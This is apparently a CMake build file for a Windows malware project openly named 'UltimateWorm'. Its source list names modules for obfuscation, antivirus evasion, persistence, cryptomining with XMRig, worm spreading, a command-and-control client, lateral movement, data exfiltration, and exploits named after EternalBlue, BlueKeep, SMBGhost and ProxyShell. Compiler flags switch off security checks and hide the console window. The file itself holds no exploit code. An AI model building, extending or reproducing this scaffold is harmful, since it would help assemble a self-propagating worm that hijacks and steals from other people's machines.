cmake_minimum_required(VERSION 3.10)
project(UltimateWorm VERSION 6.0.0)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# ============================================================================
# COMPILER SETTINGS
# ============================================================================

if(WIN32)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -DWIN32_LEAN_AND_MEAN -DNDEBUG -D_CRT_SECURE_NO_WARNINGS -DWINSOCK_DEPRECATED_NO_WARNINGS")
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS /ENTRY:WinMain")
endif()

set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} -O2 -MT -GS- -arch:AVX2 -fp:fast -Oy -Ob2 -Oi -Ot -GL -Gy -GF -GR- -GS- -sdl-")
set(CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG} -O0 -MTd -Zi -Ob0 -Od")

# ============================================================================
# SOURCE FILES
# ============================================================================

set(SOURCES
    src/main.cpp
    src/core/obfuscation.cpp
    src/core/evasion.cpp
    src/core/persistence.cpp
    src/core/xmrig_engine.cpp
    src/core/worm_engine.cpp
    src/core/c2_client.cpp
    src/core/crypto.cpp
    src/core/reconnaissance.cpp
    src/core/lateral_movement.cpp
    src/core/data_exfil.cpp
    src/core/self_destruct.cpp
    src/exploits/exploit_chain.cpp
    src/exploits/eternalblue.cpp
    src/exploits/doublepulsar.cpp
    src/exploits/smbghost.cpp
    src/exploits/bluekeep.cpp
    src/exploits/proxyshell.cpp
    src/payloads/mistpen.cpp
    src/payloads/fudmodule.cpp
    src/payloads/foresttiger.cpp
    src/payloads/troy.cpp
    src/payloads/doublepulsar_payload.cpp
    src/injection/process_injection.cpp
    src/injection/dll_injection.cpp
    src/injection/shellcode_injection.cpp
    src/injection/reflective_loader.cpp
    src/injection/process_hollowing.cpp
    src/network/scanner.cpp
    src/network/smb_client.cpp
    src/network/rdp_client.cpp
    src/network/dns_tunnel.cpp
    src/network/icmp_tunnel.cpp
    src/utils/windows_api.cpp
    src/utils/shellcode.cpp
    src/utils/crypto_utils.cpp
    src/utils/obfuscation_utils.cpp
)

# ============================================================================
# HEADER FILES
# ============================================================================

set(HEADERS
    include/worm_c2.h
    src/utils/shellcode.h
    src/utils/windows_api.h
)

# ============================================================================
# INCLUDES
# ============================================================================

include_directories(
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/src/core
    ${CMAKE_CURRENT_SOURCE_DIR}/src/exploits
    ${CMAKE_CURRENT_SOURCE_DIR}/src/payloads
    ${CMAKE_CURRENT_SOURCE_DIR}/src/injection
    ${CMAKE_CURRENT_SOURCE_DIR}/src/network
    ${CMAKE_CURRENT_SOURCE_DIR}/src/utils
)

# ============================================================================
# EXECUTABLE
# ============================================================================

add_executable(UltimateWorm WIN32 ${SOURCES} ${HEADERS})

# ============================================================================
# LINK LIBRARIES
# ============================================================================

if(WIN32)
    target_link_libraries(UltimateWorm
        user32 kernel32 advapi32 ws2_32 iphlpapi winhttp crypt32 psapi shlwapi userenv wtsapi32 wininet shell32 ole32 oleaut32 uuid
    )
endif()

# ============================================================================
# COMPILE DEFINITIONS
# ============================================================================

target_compile_definitions(UltimateWorm PRIVATE
    WORM_VERSION="${PROJECT_VERSION}"
    WORM_BUILD="${CMAKE_BUILD_TIME}"
    WORM_CODENAME="Omega"
)

# ============================================================================
# POST-BUILD
# ============================================================================

if(CMAKE_BUILD_TYPE STREQUAL "Release")
    add_custom_command(TARGET UltimateWorm POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E echo "========================================"
        COMMAND ${CMAKE_COMMAND} -E echo "ULTIMATE WORM v${PROJECT_VERSION} BUILT!"
        COMMAND ${CMAKE_COMMAND} -E echo "========================================"
        COMMAND ${CMAKE_COMMAND} -E echo "Output: ${CMAKE_CURRENT_BINARY_DIR}/UltimateWorm.exe"
        COMMAND ${CMAKE_COMMAND} -E echo "========================================"
    )
endif()

# ============================================================================
# INSTALL
# ============================================================================

install(TARGETS UltimateWorm DESTINATION bin)
